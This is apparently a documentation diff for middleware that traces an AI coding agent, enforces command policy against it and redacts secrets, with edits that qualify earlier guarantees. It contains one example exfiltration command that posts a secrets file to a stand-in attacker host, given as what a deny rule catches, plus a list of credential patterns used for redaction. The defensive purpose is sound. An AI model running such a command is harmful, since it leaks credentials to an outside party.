@@ -72,13 +72,15 @@ Two classification details do real work:
 
 ## Policy enforcement
 
-Tracing explains what happened; it does not stop anything. The Agent executes
-model-authored shell commands inside a container the control plane owns, so the
-control plane is the natural place to decide whether an action may proceed.
+Tracing explains what happened; it does not stop anything. The control plane
+also evaluates observed model-authored commands through the runner adapter.
+The runtime boundary depends on the [deployment profile](RUNBOOK.md#1-choose-a-runtime-profile).
 
 Commands are evaluated **as they are observed**, through an `onEvent` callback
-on `RunnerRequest`, not after the turn ends. A denial removes the container, so
-the command is stopped mid-flight rather than reported afterwards.
+on `RunnerRequest`, not after the turn ends. A denial requests cancellation:
+the container runner attempts to remove its disposable container, while the
+process runner terminates its child process. This is not pre-execution approval
+or a guarantee that a command had no effect before cancellation.
 
 | Rule | Protects |
 | --- | --- |
@@ -92,7 +94,7 @@ the command is stopped mid-flight rather than reported afterwards.
 Every evaluated command produces a `policy.decision` span with
 `actorType: system` — allow decisions included, so the trace shows the check
 ran rather than leaving its absence ambiguous. A denial records the rule id and
-the asset it protected, and the Run ends `failed` with
+the asset the rule is intended to protect, and the Run ends `failed` with
 `Blocked by policy <rule>: <reason>` rather than `cancelled`, because the
 platform stopped it and an operator did not.
 
@@ -103,11 +105,10 @@ built-in set with a JSON array of `{id, description, asset, pattern}`.
 URLs, so `curl https://registry.npmjs.org/...` is ordinary work and
 `curl --data @secrets.txt https://evil.test` is not.
 
-**Rules match the command shape Codex actually emits.** Codex never emits a
-bare command; every one arrives wrapped as `/usr/bin/bash -lc '<command>'`. A
-rule anchored only on whitespace passes hand-written tests and is inert in
-production, so the boundary includes quotes and subshell punctuation, and the
-test suite pins the observed wrapper shapes.
+**Rules cover observed Codex command wrappers.** Real commands can arrive as
+`/usr/bin/bash -lc '<command>'`. Matching only whitespace boundaries missed that
+observed shape, so tests cover quotes and subshell punctuation too. This does
+not establish that every future CLI version uses the same wrapper.
 
 ### Relationship to Codex's own sandbox
 
@@ -130,6 +131,8 @@ protected asset — that an OS denial does not.
   then executed would not match.
 - It governs shell commands. File edits Codex performs through its own
   `file_change` items are traced but not policy-evaluated.
+- Process cancellation does not guarantee cleanup of every descendant. Compose
+  runs the API and Codex in one container, not one container per Agent.
 - Enforcement is asynchronous: `codex exec --json` is an observational stream,
   not an approval protocol, so the host cannot veto a command before it runs.
   The decision is made when the event is observed, which is when the command
@@ -304,15 +307,17 @@ where lower is unambiguously better.
 
 ## Redaction and trust boundary
 
-`redactSecrets` runs before anything is written to disk. It strips, in order:
+Trace processing applies redaction before storing trace payloads; this does
+**not** cover all ordinary chat records or generated workspace files. It handles:
 
-1. every configured secret (the Ark API key) by exact match;
+1. configured secrets (including the Ark API key and shared access token) by exact match;
 2. credential *shapes* the process was never told about — `Bearer` and `Basic`
    authorization headers, `sk-`, `ghp_`/`gho_`/`ghs_`/`github_pat_`, `xoxb-`,
    `AIza`, AWS `AKIA`/`ASIA` key ids, PEM private-key blocks including their
    body, and the value of any `*password`/`*secret`/`*api_key`/`*token`
    assignment (the name is kept, the value is not);
-3. anything left over the length budget.
+3. sensitive object properties and JSON-encoded payloads;
+4. truncation of strings after redaction.
 
 Step 2 matters because the Agent can *discover* a credential inside its own
 workspace and echo it to stdout, where exact-match redaction against the Ark key
@@ -323,11 +328,12 @@ Redaction is applied to every span attribute (recursively through nested objects
 and arrays), every span error message, and `AgentRun.error` /
 `Agent.lastError`, which surface in the UI and API.
 
-The Ark key reaches the Runtime only as an environment variable
-(`childEnvironment()` in both runners) and is never part of a Codex JSON event,
-so string-match redaction is defence in depth rather than the only control.
+The Ark key reaches the Runtime through its environment
+(`childEnvironment()` in both runners). An Agent can attempt to print or
+transmit it, so environment delivery does not prove that it cannot enter events
+or raw chat output. Unknown or encoded secrets can evade pattern matching.
 `GET /api/runs/:id/trace` and `GET /api/runs/:id/audit` sit behind the same
-bearer-auth hook as every other `/api/*` route, and the export path re-applies
+bearer-auth hook when configured (health/auth-discovery routes are public), and the export path re-applies
 redaction at serialization time because a bundle is meant to leave the machine.
 
 ## Verifying the evidence
@@ -380,10 +386,9 @@ configured `APP_DATA_DIR`, so a reviewer can inspect the middleware without a
 BytePlus ModelArk key. It refuses to overwrite a store that already holds Agents
 unless `--force` is passed.
 
-```bash
-npm run demo:seed              # seed the default .data/ store
-npm run demo:seed -- --force   # replace an existing store
-```
+Follow the [isolated fixture instructions](RUNBOOK.md#5-credential-free-fixture-inspection).
+They use separate state directories and an explicitly configured loopback port.
+Do not use `--force` against existing Agent data just to prepare a demonstration.
 
 The fixture is built to exercise every classification path: a successful Run
 (reasoning, file writes, a passing command, an allow decision, a completed model
@@ -403,64 +408,21 @@ the seeded Runs over HTTP and verifies them on every push for that reason.
 
 ## Demo script (three minutes)
 
-The failure case below is deliberately an **Agent-caused failure**, not a
-platform misconfiguration. Breaking `ARK_MODEL` would fail the Run before the
-Agent does any work, producing a two-span trace that demonstrates nothing. The
-point of this middleware is finding a failing step *among real work*, so the
-demo has to produce real work first.
+The maintained rehearsal is [submission/DEMO.md](submission/DEMO.md). It uses a
+real normal task, live trace/export, operator cancellation and a subsequent
+successful task. Setup and verification commands live in the
+[runbook](RUNBOOK.md#4-verify-a-functional-end-to-end-run).
 
-**Without Ark credentials?** Run `npm run demo:seed`, start the server, and
-steps 3, 5, 6 and 8 all work against the fixture.
-
-1. **Baseline.** `npm run poc`, open <http://localhost:3000>, create an Agent,
-   and show its `ready` lifecycle state.
-2. **Normal case.** Send `Create a TypeScript hello-world CLI, add a test, and
-   run it.` A real model call, real file writes, and a real command execution
-   inside the disposable container.
-3. **Watch it happen.** While the Run is still going, select **Watch trace
-   live**. Steps appear as the Agent takes them, the open step's bar grows
-   against the timeline, and the panel is marked `Live`. This is the difference
-   between an observability layer and a post-mortem.
-4. **Evidence.** When it finishes, walk the tree: root → process → individual
-   `tool.call` and `model.message` spans, each with its real duration and its
-   bar on one shared axis, so the slowest step is visible without reading a
-   number. Read the stat cards — duration, tokens in/out/cached, estimated
-   cost, tool calls and model turns, warnings and errors. Expand a `tool.call`
-   to show the redacted payload. Use the count-badged filters to isolate `tool`
-   or `model` spans; note the tree stays connected because filtering keeps
-   ancestors.
-5. **Failure case.** Send `Add a second test that asserts 1 === 2 so the suite
-   fails, then run the whole suite and report the result.` The Agent reasons,
-   edits a file, runs the suite, and the command exits non-zero — a Run that
-   fails *after* doing real work.
-6. **Locate the failing step.** Open the trace and filter to **error**. The
-   failing step is isolated out of a dozen successful ones, carrying its
-   redacted stderr, while the preceding `file_change` spans still show exactly
-   what the Agent changed before it broke.
-7. **Compare the two Runs.** Open **Runs**, tick both, and press **Compare
-   runs**: the failing Run against the successful one, with the deltas in
-   duration, tokens, cost, and errors.
-8. **Export the evidence.** Press **Export JSON** to download the audit bundle:
-   `schemaVersion`, the redacted Run, the summary including its cost estimate
-   and the rates behind it, and every span. Open it and point out that secrets
-   are `[REDACTED]` in the file itself.
-9. **Check the evidence, don't just wave it.** Run
-   `npm run verify:audit -- <the file you just downloaded>`. It re-derives the
-   tree, the timings, and the redaction from the file itself and prints what it
-   found. This is the difference between exporting JSON and producing evidence.
-10. **Recovery case.** Start another task, and while it is running kill the
-   server (`Ctrl+C`) and restart it. The Run is reconciled to `cancelled` and
-   its spans are closed with `"Server restarted while this run was active"` —
-   an interrupted Run still has a readable trace instead of nothing.
-11. **Still controllable.** Open **Runs**, filter by `failed`, sort by duration
-    or tokens, and confirm the Agent returns to `ready` and accepts a new task.
-
-If short on time, cut steps 7 and 9 — but step 10 is the strongest recovery
-evidence in the submission.
+Do not equate a failed assertion with a failed Run: Codex can complete after
+reporting a command's non-zero exit, and tool-error classification remains
+incomplete. The synthetic failure fixture is labelled test data, not a guarantee
+that a live prompt will produce the same outcome.
 
 ## Automated evidence
 
-`npm run check` runs all of it.
+`npm run check` runs the typechecks, unit/regression tests and builds. The final
+two HTTP-export checks below are run separately by `npm run verify:evidence`
+(also run in CI); neither command calls a real model.
 
 | Behaviour | Test |
 | --- | --- |
@@ -535,9 +497,14 @@ evidence in the submission.
   memory-access, human-approval, or cloud-operation category yet; those
   capabilities are not built, and an empty category would be worse than an
   absent one.
-- **Payloads are stored verbatim.** Span attributes hold the whole raw Codex
-  event, so a `file_change` item can carry substantial file content into the
-  store and the export. There is no capture-level control to summarise them.
+- **Payload capture can be broad.** Span attributes retain event content after
+  redaction and bounds, so a `file_change` item can carry substantial file
+  content into the store and export. There is no capture-level summarization
+  control; ordinary conversation records and workspace files are separate from
+  trace redaction and may contain original sensitive content.
+- **Tool failure and Run failure differ.** Non-zero command exit codes are not
+  consistently classified as error spans; a model can successfully report a
+  failed test. Do not use that prompt as a guaranteed failed-Run demonstration.
 - **Event timestamps are observation times.** `observedAt` is when the control
   plane read the JSON line, not when Codex emitted it, so durations carry the
   control plane's scheduling jitter. Item types Codex reports only on completion
